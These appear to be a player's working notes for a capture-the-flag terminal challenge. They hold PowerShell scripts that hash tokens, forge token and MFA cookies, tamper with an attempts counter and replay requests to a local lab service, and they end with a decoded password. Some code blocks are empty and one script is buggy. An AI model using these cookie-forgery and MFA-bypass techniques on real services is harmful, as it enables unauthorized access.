cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
```


```powershell
# Known good pair for verification
$knownMD5 = "5f8dd236f862f4507835b0e418907ffc"
$knownSHA256 = "4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"

# List of MD5 hashes to test
$md5List = @(
    "04886164e5140175bafe599b7f1cacc8",
    "664f52463ef97bcd1729d6de1028e41e",
    "3e03cd0f3d335c6fb50122553f63ef78",
    "f2aeb18f5b3f08420eed9b548b6058c3",
    "32b9401a6d972f8c1a98de145629ea9d",
    "3a79238df0a92ab0afa44a85f914fc3b",
    "49c2a68b21b9982aa9fd64cf0fd79f72",
    "f8142c1304efb9b7e9a7f57363c2d286",
    "706457f6dd78729a8bed5bae1efaeb50",
    "bb0564aa5785045937a35a9fa3fbbc73",
    "4173a7bc22aee35c5fc48261b041d064",
    "198b8bf2cd30a7c7fed464cca1720a88",
    "3a7c8ecffeeadb164c31559f8f24a1e7",
    "288e60e318d9ad7d70d743a614442ffc",
    "87ab4cb29649807fdb716ac85cf560ea",
    "89f3ec1275407c9526a645602d56e799",
    "33539252b40b5c244b09aee8a57adbc9",
    "152899789a191d9e9150a1e3a5513b7f",
    "7cd48566f118a02f300cdfa75dee7863",
    "d798a55fca64118cea2df3c120f67569",
    "6ef5570cd43a3ec9f43c57f662201e55",
    "bf189d47c3175ada98af398669e3cac3",
    "743ac25389a0b430dd9f8e72b2ec9d7f",
    "270aabd5feaaf40185f2effa9fa2cd6e",
    "8b58850ee66bd2ab7dd2f5f850c855f8",
    "6fd00cbda10079b1d55283a88680d075",
    "612001dd92369a7750c763963bc327f0",
    "010f2cc580f74521c86215b7374eead6",
    "29860c67296d808bc6506175a8cbb422",
    "7b7f6891b6b6ab46fe2e85651db8205f",
    "45ffb41c4e458d08a8b08beeec2b4652",
    "d0e6bfb6a4e6531a0c71225f0a3d908d",
    "bd7efda0cb3c6d15dd896755003c635c",
    "5be8911ced448dbb6f0bd5a24cc36935",
    "1acbfea6a2dad66eb074b17459f8c5b6",
    "0f262d0003bd696550744fd43cd5b520",
    "8cac896f624576d825564bb30c7250eb",
    "8ef6d2e12a58d7ec521a56f25e624b80",
    "b4959370a4c484c10a1ecc53b1b56a7d",
    "38bdd7748a70529e9beb04b95c09195d",
    "8d4366f08c013f5c0c587b8508b48b15",
    "67566692ca644ddf9c1344415972fba8",
    "8fbf4152f89b7e309e89b9f7080c7230",
    "936f4db24a290032c954073b3913f444",
    "c44d8d6b03dcd4b6bf7cb53db4afdca6",
    "cb722d0b55805cd6feffc22a9f68177d",
    "724d494386f8ef9141da991926b14f9b",
    "67c7aef0d5d3e97ad2488babd2f4c749"
)

foreach($md5 in $md5List) {
    $sha256Hash = Get-FileHash -Algorithm SHA256 -InputStream ([System.IO.MemoryStream]::New([System.Text.Encoding]::ASCII.GetBytes($md5)))
    Write-Host "$md5,$($sha256Hash.Hash)"
}
```

| MD5 Hash                         | SHA256 HASH                                                      |
| -------------------------------- | ---------------------------------------------------------------- |
| 04886164e5140175bafe599b7f1cacc8 | dfd05f3b46d21bc8556cdbf544325a945ed0304ec0bb7dbfd68ed5931e7ff6ee |
| 664f52463ef97bcd1729d6de1028e41e | 1f3c45d7e7b1f7621f67136c538c6933791d3392648c7b0f8b17fb1a6343ebd5 |
| 3e03cd0f3d335c6fb50122553f63ef78 | e2dbbdbcc7e57e526841899975b6621105710e76c203c1dc30419e7f1cba5297 |
| f2aeb18f5b3f08420eed9b548b6058c3 | bc83a2c7a6279ead36370ab3509fea7483eff83c164fc7cfe3c680d879b9f9d2 |
| 32b9401a6d972f8c1a98de145629ea9d | b93772d2393029424049564b366f08b21e66282ce3d7b9da4f7a69c8891012a0 |
| 3a79238df0a92ab0afa44a85f914fc3b | 989fde082fb901ae5edfd873bf41a76bf47b318f76968d0275dad99abd5894b4 |
| 49c2a68b21b9982aa9fd64cf0fd79f72 | e2b80b2c70ba5982814b758849472c8711af8051e5261ce827c02818d7e1de8c |
| f8142c1304efb9b7e9a7f57363c2d286 | 704fecc829a3acb5e50e3277eafc03ca902e515cfd81bfa94670a44aca551d6a |
| 706457f6dd78729a8bed5bae1efaeb50 | f5251b4ca89f3c4eb6bbcf40ad41abc870ffb8bfc4d1e170df7ed88f23e20568 |
| bb0564aa5785045937a35a9fa3fbbc73 | a9fba920d17e1b98f393e691ec837a0ca41be8115389f2a634f77dceeaf20725 |
| 4173a7bc22aee35c5fc48261b041d064 | af2b19cc9cee8005c95a321605fb2aab8577c66ebd762cc2df943fee47987d86 |
| 198b8bf2cd30a7c7fed464cca1720a88 | 0f8b6bd4b5d006bd7a0fceeba10a7726430ea9af7fa4314c0a83e17acaea32b6 |
| 3a7c8ecffeeadb164c31559f8f24a1e7 | 38810a7bea5587438cbfa6a0c364619ca4f886ec403be951cf38f5158d7da4f9 |
| 288e60e318d9ad7d70d743a614442ffc | a93f039a2d5158251d509afb2bf6bc45dec47d8ac189a170a23caea07f009476 |
| 87ab4cb29649807fdb716ac85cf560ea | 89298b15becc2f6c98c53ebfebf1c91d7d569cb0895b22f840bd3b9ca400e9f7 |
| 89f3ec1275407c9526a645602d56e799 | f6bc096e3570c6622ea951b3cfb852e116d0e1460576fb9fbe6f6b75dccb46c7 |
| 33539252b40b5c244b09aee8a57adbc9 | 3877cd419e2d8907c09de27c68babfbcd88a9d8f7bebdb4385aff288d0a39631 |
| 152899789a191d9e9150a1e3a5513b7f | 1e257fca2443492c6b8621bee3117e9de40d6d6e1a7ca4861079fb74cb9dc164 |
| 7cd48566f118a02f300cdfa75dee7863 | ac7458460e359b3b940540168affc7fa354c3cc05a52a52a1a6de0538ae60ec8 |
| d798a55fca64118cea2df3c120f67569 | 65d70badac127dac0bcc4962107b708a37cf24b8dcd327c328a3c59a610f18ee |
| 6ef5570cd43a3ec9f43c57f662201e55 | e2692776b6ecd2c39373ced96f7ff8b64aeae56404352cf06aefc724cc4c7cf1 |
| bf189d47c3175ada98af398669e3cac3 | e433feb9de55166463e0bd4ba14a3cc099bd1ba1abf20fd290491bda3d3cf2e6 |
| 743ac25389a0b430dd9f8e72b2ec9d7f | cf056ae6605f7909a7e6126716e528b863807d2dc153a4d5aa00714ac72aadc4 |
| 270aabd5feaaf40185f2effa9fa2cd6e | f732a928cda0c4a51284f8b28401eac228ca2769804cfbcc16f2c8a0c58713f2 |
| 8b58850ee66bd2ab7dd2f5f850c855f8 | d2e0f89c295194775b9835f646f5bdd950eb05cb6d912602ce4ff62a30ebe437 |
| 6fd00cbda10079b1d55283a88680d075 | 7a50d248e3991bf55c361e119faa292c8661f0eb6476c868db3289793391e12f |
| 612001dd92369a7750c763963bc327f0 | bc9f1a7214052f7ad3fb5076a1862e24dc71808ba27c5d9c584d681f6c3afe6b |
| 010f2cc580f74521c86215b7374eead6 | 5bbe0d45c6a1fd01a7641ff4807009efc91fd7f5637dded8b71ad8e2ada5d086 |
| 29860c67296d808bc6506175a8cbb422 | 8fcff56c3c425a8a7163493b1f17fb330ad89fbbefddd9c5d226196c4c327bbb |
| 7b7f6891b6b6ab46fe2e85651db8205f | f892f608096e56013c3ed96e4f984c6376617c42e328e20382660370ff181ce4 |
| 45ffb41c4e458d08a8b08beeec2b4652 | d040356e54ca166cd0479d9878fc9ba1012a80419a846a58a24649f4f01b63f8 |
| d0e6bfb6a4e6531a0c71225f0a3d908d | ff1a98e7bb3d9f87c4495ee7d62c455cbad6c6a6ad4abba25a503b7c1ae113c1 |
| bd7efda0cb3c6d15dd896755003c635c | 6297f422314ea9e9172752f3a891bd505752c5f14fcab93153bcb1038fb5ab87 |
| 5be8911ced448dbb6f0bd5a24cc36935 | 04519f7af02a977a27a8d9398e86354117537fa896c437019a61f46d31bfd339 |
| 1acbfea6a2dad66eb074b17459f8c5b6 | 5a4b06401ad22fa4cf75fe22829cb14549c4f18a18c67beb16d314b80a4f44d9 |
| 0f262d0003bd696550744fd43cd5b520 | abf98108dbd1095a59bae36726fac48e3ab23da2cf2effeae02ef5c142cb76fe |
| 8cac896f624576d825564bb30c7250eb | 2dda00da692764113b97787241658a1911aeb4c0bd9b92e4fab4ffcb1fe15a33 |
| 8ef6d2e12a58d7ec521a56f25e624b80 | ce92890075a6232a039bcb06b83adf90355119a99da8d694c85681e310191bb9 |
| b4959370a4c484c10a1ecc53b1b56a7d | ae311ebe101c6ac4e11e4e338906ecedc22583fad68b85834eed3cb684fc4383 |
| 38bdd7748a70529e9beb04b95c09195d | acab8d777a0c5f9d631b4fe6e07cc14b7e063c1e48ee8a0ab876d12082ad3fea |
| 8d4366f08c013f5c0c587b8508b48b15 | 01b1f4132e95b847d89fcdc599fd685e26198aa684196663c4c0b51b1a410dc4 |
| 67566692ca644ddf9c1344415972fba8 | 368ef0eb3bd563c81f658e6c47182524256f09212010774b00939a440dabd9f6 |
| 8fbf4152f89b7e309e89b9f7080c7230 | b3395dc1f995f897f36e5ab99b7a3eada186713cc40785bb33f06c4d7c989673 |
| 936f4db24a290032c954073b3913f444 | 9992b3b85730ea436a546086036520bcf15d86b1a2a8f96e4d3c569148f770d3 |
| c44d8d6b03dcd4b6bf7cb53db4afdca6 | 35138166ced99d6a600b52f70c818cf44826170fd88b8234107ec0bd51cc276d |
| cb722d0b55805cd6feffc22a9f68177d | 15d6e335c167dea490ac4cd91815c56d7ecef3cd4b019588567710d839a9ea45 |
| 724d494386f8ef9141da991926b14f9b | 2ae009872b65d788e44f634736689af1570333fd802b93b41df09a3f7d02c0e1 |
| 67c7aef0d5d3e97ad2488babd2f4c749 | bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60 |
| 5f8dd236f862f4507835b0e418907ffc | 4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C |
 


```powershell
# Test a specific hash pair
$testMD5 = "67c7aef0d5d3e97ad2488babd2f4c749"  # Pick one from the list
$testSHA256 = "bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60" # Use corresponding generated SHA256

# Step 1: First request to get the MFA token
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$tokenCookie = New-Object System.Net.Cookie
$tokenCookie.Name = "token"
$tokenCookie.Value = $testMD5
$tokenCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($tokenCookie)

$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$testSHA256" `
                              -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication
# Step 5: Output the response content
$response.Content
```


```powershell
$token = "5f8dd236f862f4507835b0e418907ffc"
$hashedEndpoint = Get-FileHash -Algorithm SHA256 $token

Write-Host "Original token: $token"
Write-Host "Hashed endpoint: $($hashedEndpoint.Hash)"
Write-Host "Known endpoint: 4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"

# Check if they match
if($hashedEndpoint.Hash -eq "4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C") {
   Write-Host "Match found! Basic SHA256 hash works!"
   
   # If it works, let's try one of our other MD5s to confirm
   $testToken = "67c7aef0d5d3e97ad2488babd2f4c749" 
   $testHash = Get-FileHash -Algorithm SHA256 $testToken
   Write-Host "`nTest with another MD5:`n$testToken -> $($testHash.Hash)"
} else {
   Write-Host "No match - let's try another approach..."
}
```

I just found out shout out to pahtzo.

```md
pahtzo: you can scroll up in the terminal, hit CTRL-B then PGUP/PGDOWN, get out of scroll mode with ESC or Q
```

Got tired 

![[Pasted image 20241127151343.png]]

![[Pasted image 20241127151356.png]]


```powershell
$username = "admin" # Replace with your actual username 
$password = ConvertTo-SecureString "admin" -AsPlainText -Force # Replace with your actual password 
$Credential = New-Object System.Management.Automation.PSCredential($username, $password)
```
```powershell
# Step 1: First request to get the MFA token
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$tokenCookie = New-Object System.Net.Cookie
$tokenCookie.Name = "token"
$tokenCookie.Value = "67c7aef0d5d3e97ad2488babd2f4c749"  # Known working MD5
$tokenCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($tokenCookie)

# Let's try with 'admin' hash first
$response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60" `
                              -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication

# Extract the MFA value from the response
$mfaValue = $response1.Content -replace '.*?href=''([^'']+)''.*', '$1'

# Step 2: Immediately send the validation request with both tokens
$mfaCookie = New-Object System.Net.Cookie
$mfaCookie.Name = "mfa_token"
$mfaCookie.Value = $mfaValue
$mfaCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($mfaCookie)

$response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60" `
                              -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication

$response1.Content
$response2.Content
```



```powershell

```



```powershell

```



```powershell

```





```powershell
$sha256 = "bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60"
# Step 1: First request to get the MFA token
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$tokenCookie = New-Object System.Net.Cookie
$tokenCookie.Name = "token"
$tokenCookie.Value = "67c7aef0d5d3e97ad2488babd2f4c749"
$tokenCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($tokenCookie)

for ($i = 1; $i -le 11; $i++) {
   # Request MFA token
   $response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256" `
                                 -Method GET `
                                 -WebSession $webSession `
                                 -Credential $Credential `
                                 -AllowUnencryptedAuthentication
   
   $mfaValue = $response1.Content -replace '.*?href=''([^'']+)''.*', '$1'
   
   $mfaCookie = New-Object System.Net.Cookie
   $mfaCookie.Name = "mfa_token"
   $mfaCookie.Value = $mfaValue
   $mfaCookie.Domain = "127.0.0.1"
   $webSession.Cookies.Add($mfaCookie)
   
   $response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/$sha256" `
                                 -Method GET `
                                 -WebSession $webSession `
                                 -Credential $Credential `
                                 -AllowUnencryptedAuthentication
   
   Write-Host "Response ${i}: $($response2.Content)"
}

$response1.Content
$response2.Content

```

Changed code

```powershell
$username = "admin" # Replace with your actual username 
$password = ConvertTo-SecureString "admin" -AsPlainText -Force # Replace with your actual password 
$Credential = New-Object System.Management.Automation.PSCredential($username, $password)
```

```powershell
$sha256 = "bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60"
# Step 1: First request to get the MFA token
$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$tokenCookie = New-Object System.Net.Cookie
$tokenCookie.Name = "token"
$tokenCookie.Value = "67c7aef0d5d3e97ad2488babd2f4c749"
$tokenCookie.Domain = "127.0.0.1"
$webSession.Cookies.Add($tokenCookie)

# Get initial MFA token
$response1 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/$sha256" `
                              -Method GET `
                              -WebSession $webSession `
                              -Credential $Credential `
                              -AllowUnencryptedAuthentication

$mfaValue = if($response1.Content -match "href='([0-9.]+)'") {
    $matches[1]
} else {
    Write-Error "Failed to extract MFA value"
    exit 1
}

# Test threshold with multiple cookie attempts
for ($i = 1; $i -le 11; $i++) {
    $mfaCookie = New-Object System.Net.Cookie
    $attemptsCookie.Name = "attempts" 
    $attemptsCookie.Value = "11"
    $mfaCookie.Name = "mfa_token"
    $mfaCookie.Value = $mfaValue
    $mfaCookie.Domain = "127.0.0.1"
    $webSession.Cookies.Add($mfaCookie)
    
    $response2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/$sha256" `
                                  -Method GET `
                                  -WebSession $webSession `
                                  -Credential $Credential `
                                  -AllowUnencryptedAuthentication
    
    Write-Host "Cookie attempt ${i}: $($response2.Content)"
}
$response1.Content
$response2.Content
$webSession.Cookies.GetCookies("http://127.0.0.1:1225") | Format-Table Name, Value
```

```powershell
$base64Value = "Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg=="

$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Value))
Write-Host "Decoded message: $decoded"
```



```powershell

```